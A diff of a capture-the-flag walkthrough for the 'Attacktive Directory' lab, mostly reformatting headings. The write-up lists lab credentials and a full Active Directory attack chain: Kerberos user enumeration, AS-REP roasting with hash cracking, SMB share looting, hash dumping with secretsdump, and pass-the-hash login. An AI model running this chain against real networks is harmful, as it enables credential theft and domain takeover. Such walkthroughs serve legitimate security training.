@@ -1,16 +1,15 @@
 # Attacktive Directory Box Writeup
-# Completed 23:22 29 DEC 21
-# Donkeyk0ng787
+### Completed 23:22 29 DEC 21
+### Donkeyk0ng787
 
-# MY IP - 10.4.24.252
-# BOX IP - 10.10.124.44
+#### BOX IP - 10.10.124.44
 
-# Creds
+### Creds
 
 	svc-admin:management2005
 	backup@spookysec.local:backup2517860 
 
-# Task 3 - Enumeration
+### Task 3 - Enumeration
 
 	'Running a simple nmap scan
 	nmap -sC -sV 10.10.124.44 -oN nmap/initial
@@ -21,7 +20,7 @@
 	'THM_AD'
 	'.local'
 	
-# Task 4 - Enumerating Users via Kerberos
+### Task 4 - Enumerating Users via Kerberos
 
 	'Using kerbrute to find the usernames using the following command
 	./kerbrute_linux_386 userenum userlist.txt -d spookysec.local --dc spookysec.local
@@ -32,7 +31,7 @@
 	'svc-admin'
 	'backup'
 	
-# Task 5 - Abusing Kerberos
+### Task 5 - Abusing Kerberos
 
 	'For this we use a script in impacket called GetNPUsers.py
 	For this we use the following command to generate a file with the hashed password
@@ -51,7 +50,7 @@
 	'18200'
 	'management2005'
 	
-# Task 6 - Enumeration - Back to Basic
+### Task 6 - Enumeration - Back to Basic
 
 	'Now that we have an account we can use smbclient to enumerate the shares using the command
 	smbclient -L \\\\10.10.124.44 -U 'svc-admin'
@@ -69,7 +68,7 @@
 	'YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw'
 	'backup@spookysec.local:backup2517860 '
 	
-# Task 7 - Elevating Privileges in the Domain
+### Task 7 - Elevating Privileges in the Domain
 
 	'Now that we have user credentials for the backup account of the domain controller, we can use another impacket tool
 	secretsdump.py to retrieve all the password hashes that this user account has to offer. This will effectively give
@@ -85,7 +84,7 @@
 	'pass the hash'
 	'-H'
 	
-# Task 8 - Flag Submission
+### Task 8 - Flag Submission
 
 	'Using evil-winrm we can access the server and collect the flags
 	Usage is as follows
